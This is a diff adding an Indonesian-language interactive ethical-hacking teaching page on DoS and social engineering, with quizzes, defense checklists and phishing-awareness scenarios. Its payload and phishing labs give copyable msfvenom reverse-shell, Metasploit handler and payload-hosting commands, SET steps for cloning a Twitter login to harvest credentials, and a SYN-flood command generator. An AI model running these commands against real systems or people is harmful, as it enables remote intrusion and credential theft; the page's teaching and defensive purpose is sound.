+                            <span style="font-size: 0.9rem;">Peningkatan drastis pada graph Ethernet adapter (Kbps)</span>
+                        </div>
+                        <div style="background: rgba(255, 42, 109, 0.1); border: 1px solid var(--secondary); padding: 1rem; border-radius: 6px;">
+                            <strong style="color: var(--secondary);">Port Reuse</strong><br>
+                            <span style="font-size: 0.9rem;">Wireshark menunjukkan "TCP Port numbers reused"</span>
+                        </div>
+                        <div style="background: rgba(255, 42, 109, 0.1); border: 1px solid var(--secondary); padding: 1rem; border-radius: 6px;">
+                            <strong style="color: var(--secondary);">CPU 100%</strong><br>
+                            <span style="font-size: 0.9rem;">Resource exhaustion pada target machine</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- SOCIAL ENGINEERING SECTION -->
+    <section id="soceng" class="section">
+        <div class="container">
+            <h2 class="section-title">Social Engineering</h2>
+            <p class="section-subtitle">"Human error is the main cause of 95% of cybersecurity breaches." - Abuse human psychology to manipulate targets.</p>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <span class="stat-number" data-target="46">0</span>
+                    <div class="stat-label">% Businesses with incidents (2 months WFH)</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number" data-target="300">0</span>
+                    <div class="stat-label">% Data breach increase since COVID</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number" data-target="667">0</span>
+                    <div class="stat-label">% Phishing increase (March 2020)</div>
+                </div>
+            </div>
+
+            <div class="tab-container">
+                <button class="tab-btn active" onclick="openTab(event, 'se-def')">Definisi & Rules</button>
+                <button class="tab-btn" onclick="openTab(event, 'se-vectors')">Attack Vectors</button>
+                <button class="tab-btn" onclick="openTab(event, 'se-payload')">Payload Lab</button>
+                <button class="tab-btn" onclick="openTab(event, 'se-phishing')">Phishing Lab</button>
+            </div>
+
+            <div id="se-def" class="tab-content active">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">Apa itu Social Engineering?</h3>
+                <p>Social Engineering adalah <span class="highlight">penyalahgunaan psikologi manusia</span> untuk memanipulasi atau menipu seseorang agar memberikan akses ke data pribadi atau informasi seperti login credentials, card numbers, dan sensitive data.</p>
+
+                <div class="interactive-box">
+                    <h4 style="color: var(--warning); margin-bottom: 1rem;">⚠️ Entry Points Social Engineering</h4>
+                    <div class="card-grid">
+                        <div class="card">
+                            <h3>Baiting</h3>
+                            <p>Menarik korban dengan "umpan" seperti USB berisi malware yang ditinggalkan di tempat umum.</p>
+                        </div>
+                        <div class="card">
+                            <h3>Phishing & Spear-Phishing</h3>
+                            <p>Mengirim email/email yang ditargetkan (spear) yang tampak dari sumber terpercaya untuk mencuri credentials.</p>
+                        </div>
+                        <div class="card">
+                            <h3>Pretexting</h3>
+                            <p>Membuat skenario palsu (pretext) untuk mendapatkan informasi sensitif dari target.</p>
+                        </div>
+                        <div class="card">
+                            <h3>Unsafe Website</h3>
+                            <p>Memancing klik pada link berbahaya melalui email, pesan instan, atau pop-up window.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <h3 style="color: var(--primary); margin: 2rem 0 1rem;">7 Rules of Social Engineering</h3>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem;">
+                    <div class="vector-item" onclick="showRule(this, 'value')">
+                        <span>💰</span> Rule of Value & Profit
+                    </div>
+                    <div class="vector-item" onclick="showRule(this, 'reciprocity')">
+                        <span>🔄</span> Rule of Reciprocity
+                    </div>
+                    <div class="vector-item" onclick="showRule(this, 'equity')">
+                        <span>⚖️</span> Rule of Social Equity
+                    </div>
+                    <div class="vector-item" onclick="showRule(this, 'sympathy')">
+                        <span>💔</span> Rule of Sympathy
+                    </div>
+                    <div class="vector-item" onclick="showRule(this, 'unavailability')">
+                        <span>🔒</span> Rule of Unavailability
+                    </div>
+                    <div class="vector-item" onclick="showRule(this, 'engagement')">
+                        <span>🤝</span> Rule of Engagement & Consistency
+                    </div>
+                    <div class="vector-item" onclick="showRule(this, 'authority')">
+                        <span>👔</span> Rule of Authority
+                    </div>
+                </div>
+
+                <div id="rule-detail" class="vector-detail">
+                    <h4 id="rule-title" style="color: var(--secondary); margin-bottom: 0.5rem;"></h4>
+                    <p id="rule-desc"></p>
+                </div>
+            </div>
+
+            <div id="se-vectors" class="tab-content">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">Social Engineering Attack Vectors</h3>
+
+                <div class="vector-map">
+                    <div class="vector-category">
+                        <h3>🔧 Technical Vectors</h3>
+                        <div class="vector-item" onclick="showVectorDetail('vishing')">
+                            <span>📞</span> Vishing
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('spear')">
+                            <span>🎯</span> Spear Phishing
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('software')">
+                            <span>💿</span> Interesting Software
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('baiting-tech')">
+                            <span>🎣</span> Baiting
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('watering')">
+                            <span>🌊</span> Waterholing
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('phishing-email')">
+                            <span>📧</span> Phishing & Trojan Email
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('spam')">
+                            <span>🗑️</span> Spam Email
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('popup')">
+                            <span>🪟</span> Popup Window
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('tailgating')">
+                            <span>🚪</span> Tailgating
+                        </div>
+                    </div>
+
+                    <div class="vector-category">
+                        <h3>🧠 Non-Technical Vectors</h3>
+                        <div class="vector-item" onclick="showVectorDetail('pretexting')">
+                            <span>🎭</span> Pretexting / Impersonation
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('hoaxing')">
+                            <span>📢</span> Hoaxing
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('authoritative')">
+                            <span>🎙️</span> Authoritative Voice
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('tech-expert')">
+                            <span>👨‍💻</span> Technical Expert
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('smudge')">
+                            <span>👆</span> Smudge Attack
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('dumpster')">
+                            <span>🗑️</span> Dumpster Diving
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('shoulder')">
+                            <span>👁️</span> Shoulder Surfing
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('spying')">
+                            <span>🕵️</span> Spying
+                        </div>
+                        <div class="vector-item" onclick="showVectorDetail('support')">
+                            <span>🎧</span> Support Staff
+                        </div>
+                    </div>
+
+                    <div id="vector-detail-panel" class="vector-detail">
+                        <h4 id="vector-detail-title" style="color: var(--secondary); margin-bottom: 0.5rem;"></h4>
+                        <p id="vector-detail-desc"></p>
+                        <div id="vector-detail-mitigation" style="margin-top: 1rem; padding-top: 1rem; border-top: 1px solid var(--border);"></div>
+                    </div>
+                </div>
+
+                <div class="interactive-box">
+                    <h4 style="color: var(--primary); margin-bottom: 1rem;">📊 Contact Means vs No-Contact Means</h4>
+                    <table class="comparison-table">
+                        <thead>
+                            <tr>
+                                <th>Contact Means (Langsung)</th>
+                                <th>No-Contact Means (Tidak Langsung)</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Intimidation, Persuasion, Ingratiation, Assistance</td>
+                                <td>Online threats (E-mail, Web page, Instant messaging)</td>
+                            </tr>
+                            <tr>
+                                <td>Telephone threats (Telephony PBX, Service Desk)</td>
+                                <td>Waste Management Threats (External, Internal)</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div id="se-payload" class="tab-content">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">Attack Model 1: Payload Crafting</h3>
+                <p>Membuat payload executable yang akan disampaikan ke target melalui teknik social engineering.</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-label">Step 1: Craft Payload dengan Msfvenom</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 -f exe > /home/kali/Downloads/soceng.exe</pre>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-label">Step 2: Setup Handler (Listener)</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre>msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 443
+exploit</pre>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-label">Step 3: Setup HTTP Server untuk Delivery</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre>python2 -m SimpleHTTPServer 8000
+# atau untuk Python 3:
+python3 -m http.server 8000</pre>
+                </div>
+
+                <div class="interactive-box">
+                    <h4 style="color: var(--warning); margin-bottom: 1rem;">⚠️ Attack Flow</h4>
+                    <div style="display: flex; flex-direction: column; gap: 1rem;">
+                        <div style="display: flex; align-items: center; gap: 1rem;">
+                            <div style="background: var(--primary); color: var(--dark); width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">1</div>
+                            <span>Craft payload <span class="keyword">soceng.exe</span> dengan msfvenom</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 1rem;">
+                            <div style="background: var(--primary); color: var(--dark); width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">2</div>
+                            <span>Setup reverse TCP handler di attacker machine</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 1rem;">
+                            <div style="background: var(--primary); color: var(--dark); width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">3</div>
+                            <span>Deploy HTTP server untuk hosting payload</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 1rem;">
+                            <div style="background: var(--secondary); color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">4</div>
+                            <span>Target download & execute <span class="keyword">soceng.exe</span> → Session opened!</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card-grid">
+                    <div class="card">
+                        <h3>📡 Hasil Serangan</h3>
+                        <p>Setelah target menjalankan file:</p>
+                        <ul style="margin-top: 0.5rem; padding-left: 1.2rem;">
+                            <li>Meterpreter session terbuka</li>
+                            <li>Command prompt target tersedia</li>
+                            <li>Akses file system, keylogger, screenshot</li>
+                            <li>Privilege escalation possible</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>🛡️ Mitigasi</h3>
+                        <ul style="padding-left: 1.2rem;">
+                            <li>Jangan download file dari sumber tidak dikenal</li>
+                            <li>Verifikasi digital signature</li>
+                            <li>Gunakan antivirus & EDR</li>
+                            <li>User awareness training</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div id="se-phishing" class="tab-content">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">Attack Model 2: Fake Website & Credential Harvesting</h3>
+                <p>Membuat clone website untuk mencuri credentials korban menggunakan <span class="highlight">Social-Engineer Toolkit (SET)</span>.</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-label">Launch SET Toolkit</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre>sudo setoolkit</pre>
+                </div>
+
+                <div class="interactive-box">
+                    <h4 style="color: var(--primary); margin-bottom: 1rem;">📋 SET Menu Selection</h4>
+                    <div style="display: flex; flex-direction: column; gap: 0.5rem;">
+                        <div style="background: rgba(0,0,0,0.2); padding: 0.75rem; border-radius: 4px; border-left: 3px solid var(--primary);">
+                            <strong>1)</strong> Social-Engineering Attacks
+                        </div>
+                        <div style="background: rgba(0,0,0,0.2); padding: 0.75rem; border-radius: 4px; border-left: 3px solid var(--primary); margin-left: 1rem;">
+                            <strong>2)</strong> Website Attack Vectors
+                        </div>
+                        <div style="background: rgba(0,0,0,0.2); padding: 0.75rem; border-radius: 4px; border-left: 3px solid var(--primary); margin-left: 2rem;">
+                            <strong>3)</strong> Credential Harvester Attack Method
+                        </div>
+                        <div style="background: rgba(0,0,0,0.2); padding: 0.75rem; border-radius: 4px; border-left: 3px solid var(--primary); margin-left: 3rem;">
+                            <strong>2)</strong> Site Cloner
+                        </div>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-label">SET Configuration</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre># Setelah memilih Site Cloner:
+# Masukkan IP address attacker (listener): 192.168.1.5
+# Masukkan URL site yang akan di-clone: https://twitter.com
+
+# SET akan otomatis:
+# 1. Clone halaman login Twitter
+# 2. Setup listener pada IP attacker
+# 3. Simpan credentials yang diinput korban</pre>
+                </div>
+
+                <div class="card-grid">
+                    <div class="card">
+                        <h3>🎣 Hasil Clone</h3>
+                        <p>Website clone akan tersedia di <span class="keyword">http://192.168.1.5</span> dengan tampilan identik Twitter login page. Korban yang login akan mengirim credentials ke attacker.</p>
+                    </div>
+                    <div class="card">
+                        <h3>📧 Delivery Vector</h3>
+                        <p>Gunakan email blasting dengan pretext "Maintenance: Please update your password" yang mengarahkan ke IP attacker.</p>
+                    </div>
+                </div>
+
+                <div class="interactive-box">
+                    <h4 style="color: var(--warning); margin-bottom: 1rem;">🕵️ Identifikasi Fake Website</h4>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem;">
+                        <div style="text-align: center; padding: 1rem; background: rgba(255, 42, 109, 0.1); border-radius: 6px;">
+                            <div style="font-size: 2rem; margin-bottom: 0.5rem;">🔒</div>
+                            <strong>Not Secure</strong><br>
+                            <span style="font-size: 0.85rem;">Tidak ada HTTPS/padlock valid</span>
+                        </div>
+                        <div style="text-align: center; padding: 1rem; background: rgba(255, 42, 109, 0.1); border-radius: 6px;">
+                            <div style="font-size: 2rem; margin-bottom: 0.5rem;">🔗</div>
+                            <strong>Suspicious URL</strong><br>
+                            <span style="font-size: 0.85rem;">IP address bukan domain resmi</span>
+                        </div>
+                        <div style="text-align: center; padding: 1rem; background: rgba(255, 42, 109, 0.1); border-radius: 6px;">
+                            <div style="font-size: 2rem; margin-bottom: 0.5rem;">📧</div>
+                            <strong>Urgent Language</strong><br>
+                            <span style="font-size: 0.85rem;">"Segera update password!"</span>
+                        </div>
+                        <div style="text-align: center; padding: 1rem; background: rgba(255, 42, 109, 0.1); border-radius: 6px;">
+                            <div style="font-size: 2rem; margin-bottom: 0.5rem;">👤</div>
+                            <strong>Sender Anomaly</strong><br>
+                            <span style="font-size: 0.85rem;">Email tidak dari domain resmi</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- LABS SECTION -->
+    <section id="labs" class="section">
+        <div class="container">
+            <h2 class="section-title">Hands-On Labs</h2>
+            <p class="section-subtitle">Praktik langsung dengan command generator dan scenario simulator.</p>
+
+            <div class="tab-container">
+                <button class="tab-btn active" onclick="openTab(event, 'lab-cmd')">Command Generator</button>
+                <button class="tab-btn" onclick="openTab(event, 'lab-scenario')">Scenario Simulator</button>
+                <button class="tab-btn" onclick="openTab(event, 'lab-checklist')">Security Checklist</button>
+            </div>
+
+            <div id="lab-cmd" class="tab-content active">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">🖥️ Interactive Command Generator</h3>
+                <p>Pilih tool dan parameter untuk generate command yang sesuai dengan lingkungan lab Anda.</p>
+
+                <div class="interactive-box">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        <div>
+                            <label style="display: block; margin-bottom: 0.5rem; color: var(--primary);">Tool</label>
+                            <select id="cmd-tool" style="width: 100%; padding: 0.5rem; background: var(--dark); border: 1px solid var(--border); color: var(--light); border-radius: 4px;" onchange="generateCommand()">
+                                <option value="nmap">Nmap Port Scan</option>
+                                <option value="hping3">Hping3 SYN Flood</option>
+                                <option value="msfvenom">Msfvenom Payload</option>
+                                <option value="msfhandler">Metasploit Handler</option>
+                                <option value="python-server">Python HTTP Server</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label style="display: block; margin-bottom: 0.5rem; color: var(--primary);">Target IP / LHOST</label>
+                            <input type="text" id="cmd-ip" value="192.168.1.10" style="width: 100%; padding: 0.5rem; background: var(--dark); border: 1px solid var(--border); color: var(--light); border-radius: 4px;" oninput="generateCommand()">
+                        </div>
+                        <div>
+                            <label style="display: block; margin-bottom: 0.5rem; color: var(--primary);">Port / LPORT</label>
+                            <input type="text" id="cmd-port" value="445" style="width: 100%; padding: 0.5rem; background: var(--dark); border: 1px solid var(--border); color: var(--light); border-radius: 4px;" oninput="generateCommand()">
+                        </div>
+                    </div>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-label">Generated Command</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre id="generated-cmd">nmap -p- 192.168.1.10</pre>
+                    </div>
+                </div>
+
+                <div class="card-grid">
+                    <div class="card">
+                        <h3>🔍 Reconnaissance Checklist</h3>
+                        <ul style="padding-left: 1.2rem;">
+                            <li>Identifikasi open ports (nmap)</li>
+                            <li>Cek OS fingerprinting</li>
+                            <li>Service version detection</li>
+                            <li>Network topology mapping</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>⚔️ Attack Execution</h3>
+                        <ul style="padding-left: 1.2rem;">
+                            <li>SYN Flood via hping3/msf</li>
+                            <li>Monitor dengan Wireshark</li>
+                            <li>Verify resource exhaustion</li>
+                            <li>Document attack timeline</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>🛡️ Post-Attack Analysis</h3>
+                        <ul style="padding-left: 1.2rem;">
+                            <li>Analisis log KFSensor</li>
+                            <li>Review packet capture</li>
+                            <li>Measure recovery time</li>
+                            <li>Update defense rules</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div id="lab-scenario" class="tab-content">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">🎭 Scenario-Based Simulator</h3>
+                <p>Uji kemampuan Anda dalam mengidentifikasi dan merespons berbagai situasi security.</p>
+
+                <div class="scenario-box" id="scenario-container">
+                    <div class="scenario-text" id="scenario-text">
+                        <strong>Skenario 1:</strong> Anda menerima email dari "IT Support" dengan subject "Maintenance: Please update your password". Email berisi link yang mengarah ke halaman login yang tampak identik dengan portal perusahaan Anda, tetapi URL-nya adalah <span class="keyword">http://192.168.1.5</span>. Apa yang Anda lakukan?
+                    </div>
+
+                    <div class="scenario-options" id="scenario-options">
+                        <button class="scenario-btn" onclick="handleScenario(0, 0)">
+                            <strong>A.</strong> Segera klik link dan update password karena email mengatakan "urgent"
+                        </button>
+                        <button class="scenario-btn" onclick="handleScenario(0, 1)">
+                            <strong>B.</strong> Abaikan email dan laporkan ke security team karena URL mencurigakan
+                        </button>
+                        <button class="scenario-btn" onclick="handleScenario(0, 2)">
+                            <strong>C.</strong> Klik link tapi jangan input password, hanya lihat tampilannya
+                        </button>
+                    </div>
+
+                    <div class="scenario-result" id="scenario-result"></div>
+                </div>
+
+                <div style="text-align: center; margin-top: 1rem;">
+                    <button class="btn" onclick="nextScenario()">Skenario Berikutnya →</button>
+                </div>
+            </div>
+
+            <div id="lab-checklist" class="tab-content">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">✅ Security Awareness Checklist</h3>
+
+                <div class="interactive-box">
+                    <h4 style="color: var(--warning); margin-bottom: 1rem;">DoS Defense Checklist</h4>
+                    <div id="dos-checklist">
+                        <div style="display: flex; align-items: center; gap: 1rem; padding: 0.75rem; border-bottom: 1px solid var(--border);">
+                            <input type="checkbox" id="chk1" onchange="updateChecklist()" style="width: 20px; height: 20px; accent-color: var(--primary);">
+                            <label for="chk1">Konfigurasi SYN Cookies pada server</label>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 1rem; padding: 0.75rem; border-bottom: 1px solid var(--border);">
+                            <input type="checkbox" id="chk2" onchange="updateChecklist()" style="width: 20px; height: 20px; accent-color: var(--primary);">
+                            <label for="chk2">Rate limiting pada firewall (iptables/ufw)</label>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 1rem; padding: 0.75rem; border-bottom: 1px solid var(--border);">
+                            <input type="checkbox" id="chk3" onchange="updateChecklist()" style="width: 20px; height: 20px; accent-color: var(--primary);">
+                            <label for="chk3">Deploy IDS/IPS (Snort, Suricata, KFSensor)</label>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 1rem; padding: 0.75rem; border-bottom: 1px solid var(--border);">
+                            <input type="checkbox" id="chk4" onchange="updateChecklist()" style="width: 20px; height: 20px; accent-color: var(--primary);">
+                            <label for="chk4">Load balancer & CDN untuk distribusi traffic</label>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 1rem; padding: 0.75rem; border-bottom: 1px solid var(--border);">
+                            <input type="checkbox" id="chk5" onchange="updateChecklist()" style="width: 20px; height: 20px; accent-color: var(--primary);">
+                            <label for="chk5">Monitoring bandwidth anomaly 24/7</label>
+                        </div>
+                    </div>
+                    <div style="margin-top: 1rem; text-align: center;">
+                        <span id="checklist-progress" style="font-size: 1.2rem; color: var(--primary);">Progress: 0/5</span>
+                    </div>
+                </div>
+
+                <div class="interactive-box">
+                    <h4 style="color: var(--warning); margin-bottom: 1rem;">Social Engineering Defense Checklist</h4>
+                    <div id="se-checklist">
+                        <div style="display: flex; align-items: center; gap: 1rem; padding: 0.75rem; border-bottom: 1px solid var(--border);">
+                            <input type="checkbox" id="chk-se1" onchange="updateChecklist()" style="width: 20px; height: 20px; accent-color: var(--primary);">
+                            <label for="chk-se1">Verifikasi sender email address (bukan hanya display name)</label>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 1rem; padding: 0.75rem; border-bottom: 1px solid var(--border);">
+                            <input type="checkbox" id="chk-se2" onchange="updateChecklist()" style="width: 20px; height: 20px; accent-color: var(--primary);">
+                            <label for="chk-se2">Hover link sebelum klik untuk cek URL asli</label>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 1rem; padding: 0.75rem; border-bottom: 1px solid var(--border);">
+                            <input type="checkbox" id="chk-se3" onchange="updateChecklist()" style="width: 20px; height: 20px; accent-color: var(--primary);">
+                            <label for="chk-se3">Jangan download attachment dari sumber tidak dikenal</label>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 1rem; padding: 0.75rem; border-bottom: 1px solid var(--border);">
+                            <input type="checkbox" id="chk-se4" onchange="updateChecklist()" style="width: 20px; height: 20px; accent-color: var(--primary);">
+                            <label for="chk-se4">Verifikasi permintaan sensitif via channel alternatif</label>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 1rem; padding: 0.75rem; border-bottom: 1px solid var(--border);">
+                            <input type="checkbox" id="chk-se5" onchange="updateChecklist()" style="width: 20px; height: 20px; accent-color: var(--primary);">
+                            <label for="chk-se5">Laporkan suspicious email ke security team</label>
+                        </div>
+                    </div>
+                    <div style="margin-top: 1rem; text-align: center;">
+                        <span id="checklist-se-progress" style="font-size: 1.2rem; color: var(--primary);">Progress: 0/5</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- QUIZ SECTION -->
+    <section id="quiz" class="section">
+        <div class="container">
+            <h2 class="section-title">Quiz & Knowledge Test</h2>
+            <p class="section-subtitle">Uji pemahaman Anda tentang DoS/DDoS dan Social Engineering.</p>
+
+            <div class="progress-container">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                    <span>Quiz Progress</span>
+                    <span id="quiz-progress-text">Question 1/10</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="quiz-progress-fill" style="width: 10%"></div>
+                </div>
+            </div>
+
+            <div class="quiz-container" id="quiz-container">
+                <div class="quiz-question" id="quiz-question">
+                    Apa perbedaan utama antara DoS dan DDoS attack?
+                </div>
+                <div class="quiz-options" id="quiz-options">
+                    <div class="quiz-option" onclick="selectAnswer(0)">
+                        <input type="radio" name="quiz" id="opt0">
+                        <label for="opt0">DoS lebih berbahaya daripada DDoS</label>
+                    </div>
+                    <div class="quiz-option" onclick="selectAnswer(1)">
+                        <input type="radio" name="quiz" id="opt1">
+                        <label for="opt1">DoS menggunakan satu sumber, DDoS menggunakan banyak sumber (botnet)</label>
+                    </div>
+                    <div class="quiz-option" onclick="selectAnswer(2)">
+                        <input type="radio" name="quiz" id="opt2">
+                        <label for="opt2">DoS menyerang hardware, DDoS menyerang software</label>
+                    </div>
+                    <div class="quiz-option" onclick="selectAnswer(3)">
+                        <input type="radio" name="quiz" id="opt3">
+                        <label for="opt3">Tidak ada perbedaan, keduanya sama</label>
+                    </div>
+                </div>
+                <div class="quiz-feedback" id="quiz-feedback"></div>
+
+                <div style="display: flex; justify-content: space-between; margin-top: 2rem;">
+                    <button class="btn btn-outline" onclick="prevQuestion()" id="btn-prev" style="display: none;">← Previous</button>
+                    <button class="btn" onclick="checkAnswer()" id="btn-check">Check Answer</button>
+                    <button class="btn" onclick="nextQuestion()" id="btn-next" style="display: none;">Next →</button>
+                </div>
+            </div>
+
+            <div class="interactive-box" id="quiz-result" style="display: none; text-align: center;">
+                <h2 style="color: var(--primary); margin-bottom: 1rem;">🎉 Quiz Selesai!</h2>
+                <div style="font-size: 3rem; margin-bottom: 1rem;">
+                    <span id="final-score">0</span>/10
+                </div>
+                <p id="result-message" style="font-size: 1.2rem; margin-bottom: 2rem;"></p>
+                <button class="btn" onclick="restartQuiz()">🔄 Restart Quiz</button>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <div class="footer-links">
+                <a href="#" onclick="showSection('home')">Home</a>
+                <a href="#" onclick="showSection('dos')">DoS/DDoS</a>
+                <a href="#" onclick="showSection('soceng')">Social Engineering</a>
+                <a href="#" onclick="showSection('labs')">Labs</a>
+                <a href="#" onclick="showSection('quiz')">Quiz</a>
+            </div>
+            <p>Ethical Hacking Interactive Lab | Telkom University Curriculum</p>
+            <p style="margin-top: 0.5rem; font-size: 0.85rem;">Dibuat untuk tujuan edukasi. Gunakan pengetahuan ini secara bertanggung jawab.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Navigation
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.getElementById(sectionId).classList.add('active');
+            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+            document.querySelector(`[data-section="${sectionId}"]`).classList.add('active');
+            window.scrollTo(0, 0);
+            updateProgress();
+        }
+
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                showSection(link.dataset.section);
+            });
+        });
+
+        // Tab System
+        function openTab(evt, tabId) {
+            const parent = evt.target.closest('.container');
+            parent.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            parent.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            evt.target.classList.add('active');
+        }
+
+        // Copy Code
+        function copyCode(btn) {
+            const code = btn.closest('.code-block').querySelector('pre').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                btn.textContent = 'Copied!';
+                btn.classList.add('copied');
+                setTimeout(() => {
+                    btn.textContent = 'Copy';
+                    btn.classList.remove('copied');
+                }, 2000);
+            });
+        }
+
+        // TCP Handshake Animation
+        let handshakeStep = 0;
+        function animateHandshake() {
+            resetHandshake();
+            const status = document.getElementById('handshake-status');
+
+            setTimeout(() => {
+                document.getElementById('packet-syn').classList.add('show');
+                status.textContent = '➡️ Step 1: Client mengirim SYN ke Server';
+            }, 500);
+
+            setTimeout(() => {
+                document.getElementById('packet-synack').classList.add('show');
+                status.textContent = '⬅️ Step 2: Server membalas dengan SYN-ACK';
+            }, 1500);
+
+            setTimeout(() => {
+                document.getElementById('packet-ack').classList.add('show');
+                status.textContent = '✅ Step 3: Client mengirim ACK - Handshake complete!';
+            }, 2500);
+        }
+
+        function animateSynFlood() {
+            resetHandshake();
+            const status = document.getElementById('handshake-status');
+            let count = 0;
+
+            const interval = setInterval(() => {
+                count++;
+                const syn = document.getElementById('packet-syn').cloneNode(true);
+                syn.id = 'syn-flood-' + count;
+                syn.style.top = (35 + Math.random() * 20) + '%';
+                syn.style.left = '25%';
+                syn.style.background = 'var(--secondary)';
+                syn.textContent = 'SYN #' + count;
+                document.getElementById('handshake-visual').appendChild(syn);
+
+                setTimeout(() => syn.classList.add('show'), 50);
+
+                status.textContent = `⚠️ SYN Flood: ${count} SYN packets terkirim tanpa ACK! Server resources exhausted.`;
+                status.style.color = 'var(--secondary)';
+
+                if (count >= 8) {
+                    clearInterval(interval);
+                    status.textContent = '🔴 Attack Success: Server tidak dapat menerima koneksi legitimate baru!';
+                }
+            }, 300);
+        }
+
+        function resetHandshake() {
+            document.querySelectorAll('[id^="syn-flood-"]').forEach(el => el.remove());
+            document.querySelectorAll('.packet').forEach(p => p.classList.remove('show'));
+            document.getElementById('handshake-status').textContent = '';
+            document.getElementById('handshake-status').style.color = 'var(--primary)';
+        }
+
+        // Rule Details
+        const rules = {
+            value: { title: 'Rule of Value & Profit', desc: 'Manusia cenderung tertarik pada sesuatu yang dianggap bernilai atau menguntungkan. Attacker menawarkan "hadiah", "diskon", atau "informasi eksklusif" untuk memancing korban.' },
+            reciprocity: { title: 'Rule of Reciprocity', desc: 'Jika seseorang memberi kita sesuatu, kita merasa berkewajiban membalas. Attacker memberikan bantuan kecil atau informasi palsu agar korban merasa berutang budi.' },
